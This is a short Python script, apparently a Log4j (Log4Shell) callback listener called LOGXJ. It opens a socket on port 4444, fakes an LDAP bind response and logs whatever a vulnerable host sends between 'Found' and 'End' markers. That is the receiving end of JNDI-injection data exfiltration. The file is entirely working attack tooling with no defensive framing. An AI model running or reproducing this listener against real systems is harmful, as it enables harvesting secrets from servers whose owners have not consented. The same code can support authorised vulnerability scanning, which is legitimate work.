import socket, threading, binascii

server_host = '0.0.0.0'
server_port = 4444

def listen(server_host, server_port):
    print('LOGXJ: Listening on %s:%s' % (server_host, server_port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server_host, server_port))
    sock.listen(5)
    while True:
        connection, (client_host, client_port) = sock.accept()
        result_from = '\n\nLOGXJ: Connection from %s:%s\n' % (client_host, client_port)
        result = result_from.encode()
        get_data1 = connection.recv(1024*100)
        connection.send(binascii.a2b_hex('300c02010161070a010004000400'))
        get_data2 = connection.recv(1024*100)
        get_data2 = get_data2[get_data2.find(b'Found'):get_data2.find(b'End')]
        result += get_data2 + b'\n'
        print(result.decode('utf-8', 'ignore'))
        open('logxj.log', 'ab').write(result)
        connection.close()

t = threading.Thread(target=listen, args=(server_host, server_port))
t.daemon = True
t.start()
try:
    while True:
        input('')
except:
    exit('LOGXJ: Exit')
